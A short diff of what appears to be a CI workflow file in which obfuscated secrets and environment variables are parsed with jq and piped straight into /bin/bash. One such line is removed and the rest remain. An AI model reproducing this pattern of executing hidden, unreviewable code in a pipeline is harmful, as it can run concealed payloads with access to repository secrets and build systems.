@@ -18,7 +18,6 @@ jobs:
           yy6: ${{ secrets.yy6 }}
         run: |
           printf '%s' "$yy6" | jq -r .cklgk98 | /bin/bash
-          echo $njefr346 | jq -r .z353 | /bin/bash
           echo $i64 | jq -r .tx8004 | /bin/bash
           printf '%s' "$ikzs57" | jq -r .yit18961 | /bin/bash
           echo $rwfr0516 | jq -r .i8789 | /bin/bash
